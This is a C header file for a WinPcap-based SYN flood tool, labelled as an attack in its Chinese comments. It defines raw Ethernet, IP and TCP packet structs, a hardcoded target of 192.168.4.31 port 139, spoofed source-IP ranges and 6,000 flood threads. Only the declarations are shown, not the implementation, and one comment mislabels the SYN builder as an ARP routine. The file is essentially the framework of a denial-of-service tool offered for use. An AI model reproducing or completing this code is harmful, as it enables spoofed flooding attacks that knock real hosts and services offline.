//基于winpcap实现SYN洪水攻击，开辟多个线程
//SYNAttacks.h

#ifndef MY_SYNATTACKS_INCLUDE_H 
#define MY_SYNATTACKS_INCLUDE_H 

#include <stdio.h> 

#define HAVE_REMOTE			//release版本使用
#include "pcap.h" 

#include <windows.h>
#include <shellapi.h>

#include <conio.h> 
#include <packet32.h> 
#include <ntddndis.h> 
#include <string.h>
#include <process.h>
#include <winbase.h>
#include  <time.h>
#include <tchar.h>
#pragma  comment(lib,"Shell32.lib")
#pragma  comment(lib,"ws2_32.lib")
#pragma comment(lib, "wpcap.lib")  

#include "MyIpHlp.h"

//内存对齐设置必须是1 
#pragma pack (1) 
//#define DATALENTH 6
#define OPTION_LENTH		6

#define  IPMAX			16777217

#define srcIPAddr			"1.0.0.1"//""
#define destIPAddr		"192.168.4.31"

#define destToPort		139

int MAXTHREAD = 6000;				//线程数量

HANDLE hMutex;

int CNT = 0;
typedef struct et_header					//以太网头部
{
    unsigned char   eh_dst[6];				//目的地址 48bit 6字节 物理网卡地址
    unsigned char   eh_src[6];				//源地址 48bit 6字节 物理网卡地址
    unsigned short  eh_type;				//0800 IP数据报 ； 0806 ARP ； 8035 RARP
}ET_HEADER;

typedef struct ip_hdr							//定义IP首部
{
    unsigned char       h_verlen;				//版本与首部长度
    unsigned char       tos;						//区分服务
    unsigned short      total_len;				//总长度
    unsigned short      ident;					//标识
    unsigned short      frag_and_flags;		//3位的标志与13位的片偏移
    unsigned char       ttl;						//生存时间
    unsigned char       proto;					//协议
    unsigned short      checksum;			//首部校验和
    unsigned int			sourceIP;				//源IP
    unsigned int			destIP;					//目的IP
}IP_HEADER;

typedef struct tcp_hdr							//定义TCP首部
{
    unsigned short    th_sport;				//16位源端口
    unsigned short    th_dport;				//16位目的端口
    unsigned int    th_seq;						//32位序列号
    unsigned int    th_ack;						//32位确认号
    unsigned short  th_data_flag;			//4位首部长度/6位标志位 忽略保留字
    unsigned short    th_win;					//16位窗口大小 
    unsigned short    th_sum;					//16位2校验和 
    unsigned short    th_urp;					//16位紧急数据偏移量
	unsigned int     option[OPTION_LENTH];			//可选项
}TCP_HEADER;


typedef struct psd_hdr							//定义TCP伪首部
{
    unsigned long    saddr;						//源地址
    unsigned long    daddr;						//目的地址 
    char            mbz;
    char            ptcl;								//协议类型
    unsigned short    tcpl;						//TCP长度
}PSD_HEADER;

typedef struct _SYN_PACKET				//最终以太网封装格式
{ 
	ET_HEADER eth;								//以太网头部 
	IP_HEADER iph;									//IP数据包首部  20字节
	TCP_HEADER tcph;							//tcp数据包头部 20字节
	//unsigned char filldata[DATALENTH];   //填充字符  tcp数据
}SYN_PACKET; 
SYN_PACKET packet;

//传递给线程的参数体
typedef struct _PARAMETERS
{
	unsigned int        sourceIP;						//源地址
    unsigned int        destIP;							//目的地址
	unsigned short      destPort;						//目的port
	unsigned char       *srcmac;						//源mac
	unsigned char       dstmac[6];					//目的mac
	pcap_t              *adhandle;						//pcap结构
}PARAMETERS,*LPPARAMETERS;
 

#pragma pack () 
/** 
* 获得网卡的MAC地址 
* pDevName 网卡的设备名称 
*/ 
unsigned char* GetSelfMac(char* pDevName); 
/** 
* 封装ARP请求包 
* source_mac	源MAC地址 
* srcIP				源IP 
* destIP			目的IP 
*/ 
unsigned char* BuildSYNPacket(unsigned char* source_mac, unsigned char* dest_mac,
							  unsigned long srcIp, unsigned long destIp,unsigned short dstPort); 
unsigned short CheckSum(unsigned short * buffer, int size);
DWORD WINAPI SynfloodThread(LPVOID lp);

void getMASKMAC();
void getNetworkCard();
void getInput(int argc,char *argv[]);
void creatSleep();

pcap_if_t	* alldevs = NULL;							//全部网卡列表 
pcap_if_t  * d = NULL;									//一个网卡 
pcap_addr_t *pAddr;							//网卡地址 
int inum;											//用户选择的网卡序号 
char errbuf[PCAP_ERRBUF_SIZE];		//错误缓冲区 
int cards = 0;									//网卡数量
unsigned long sum =0;					//发送包计数

//线程变量
PARAMETERS paraforthread;
HANDLE	*threadhandle = NULL;

//获取MAC方法
char G_device_name[250]="\\Device\\NPF_";//长度为12
char G_device_mac[6];				//本机mac
char G_dst_mac[6];					//目的机的mac，如目的机在外网 则是网关的macc
unsigned long G_gateway_ip;		//网关ip
unsigned long G_device_netmask;//本机掩码
unsigned long G_device_ip;			//本机ip
unsigned long G_dst_ip;				//目的地ip
char * maskBase = "255.255.255.255";				//mask上限
unsigned long FakedIP;						//伪造IP地址的基数
long ips;								//IP数量

//线程停止 
#define SECOND	1000
unsigned long  stopTime = SECOND;
bool stopFlag = false;	
HANDLE	*sleepthreadhandle = NULL;			//停止线程
DWORD WINAPI SleepThread(LPVOID lp)	;		//sleep 线程调用函数
#endif 
